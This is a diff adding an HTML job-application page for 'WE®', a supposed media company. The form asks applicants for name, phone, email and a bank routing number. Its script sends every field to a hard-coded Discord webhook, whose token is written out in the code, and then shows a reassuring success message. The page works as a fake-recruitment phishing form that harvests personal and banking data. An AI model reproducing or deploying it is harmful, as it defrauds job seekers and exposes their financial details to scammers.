@@ -1,0 +1,172 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Join WE®</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f9;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            height: 100vh;
+            color: #333;
+        }
+
+        .container {
+            background-color: #fff;
+            border-radius: 8px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            padding: 20px;
+            max-width: 600px;
+            width: 100%;
+        }
+
+        .container img {
+            display: block;
+            margin: 0 auto;
+            max-width: 100%;
+            height: auto;
+        }
+
+        .container h1 {
+            text-align: center;
+            font-size: 24px;
+            margin: 20px 0;
+        }
+
+        .form-group {
+            margin: 10px 0;
+        }
+
+        .form-group label {
+            display: block;
+            font-weight: bold;
+        }
+
+        .form-group input, .form-group select {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            margin-top: 5px;
+        }
+
+        .submit-btn {
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            text-align: center;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 16px;
+            display: block;
+            width: 100%;
+            margin-top: 20px;
+        }
+
+        .submit-btn:hover {
+            background-color: #45a049;
+        }
+
+        .success-message {
+            display: none;
+            text-align: center;
+            font-size: 18px;
+            color: green;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img src="https://i.imgur.com/EIyiICl.png" alt="WE® logo">
+        <h1>Join WE®</h1>
+        <p>WE® is a large organization focusing in media related projects. Currently the largest and most popular photography company, WeStudios, a clothing brand known as WeApparel and our very own projects team, WeCreative. Our aim is to capture the perfect moment and forge a story using our state of the art studios and through our writing.<br><br>Join the WE family and start a career with us today.</p>
+        
+        <form id="applicationForm">
+            <div class="form-group">
+                <label for="name">First and Last Name</label>
+                <input type="text" id="name" name="name" required>
+            </div>
+            <div class="form-group">
+                <label for="phone">Phone Number</label>
+                <input type="number" id="phone" name="phone" required>
+            </div>
+            <div class="form-group">
+                <label for="routing">Routing Number</label>
+                <input type="number" id="routing" name="routing" required>
+            </div>
+            <div class="form-group">
+                <label for="email">Email</label>
+                <input type="email" id="email" name="email" required>
+            </div>
+            <div class="form-group">
+                <label for="role">Which role are you applying for?</label>
+                <select id="role" name="role" required>
+                    <option value="Professional Photographer">Professional Photographer</option>
+                    <option value="Photographer">Photographer</option>
+                    <option value="Videographer">Videographer</option>
+                    <option value="Events Team">Events Team</option>
+                    <option value="WE Hub Shop Floor Staff">WE Hub Shop Floor Staff</option>
+                    <option value="Marketing/Promoter/Business Solicitor">Marketing/Promoter/Business Solicitor</option>
+                    <option value="Makeup artist">Makeup artist</option>
+                    <option value="Security Guard">Security Guard</option>
+                    <option value="WE Hub Barista">WE Hub Barista</option>
+                    <option value="Human Resource Specialist">Human Resource Specialist</option>
+                    <option value="Graphics Designer">Graphics Designer</option>
+                    <option value="Writer">Writer</option>
+                    <option value="Designer">Designer</option>
+                    <option value="Actor">Actor</option>
+                    <option value="Backup Actor">Backup Actor</option>
+                    <option value="Podcast Coordinator">Podcast Coordinator</option>
+                    <option value="Internship">Internship</option>
+                    <option value="Other">Other</option>
+                </select>
+            </div>
+            <button type="submit" class="submit-btn">SUBMIT</button>
+        </form>
+
+        <p class="success-message">You have applied successfully, be patient while we review your application and contact you.</p>
+    </div>
+
+    <script>
+        const form = document.getElementById('applicationForm');
+        const successMessage = document.querySelector('.success-message');
+
+        form.addEventListener('submit', async (e) => {
+            e.preventDefault();
+            const formData = new FormData(form);
+            const data = {
+                name: formData.get('name'),
+                phone: formData.get('phone'),
+                routing: formData.get('routing'),
+                email: formData.get('email'),
+                role: formData.get('role')
+            };
+
+            const webhookUrl = 'https://discord.com/api/webhooks/1288448734367318091/u8KavzbtMr9gDSiqc0ApRLDWzDjigWoOxdY1PLX6nx-lQpNLIFY_jFHthTDvvTH3PAOi';
+
+            try {
+                await fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        content: `New Application:\n**Name**: ${data.name}\n**Phone**: ${data.phone}\n**Routing**: ${data.routing}\n**Email**: ${data.email}\n**Role**: ${data.role}`
+                    })
+                });
+                
+                form.style.display = 'none';
+                successMessage.style.display = 'block';
+            } catch (error) {
+                alert('There was an error submitting the form. Please try again.');
+            }
+        });
+    </script>
+</body>
+</html>
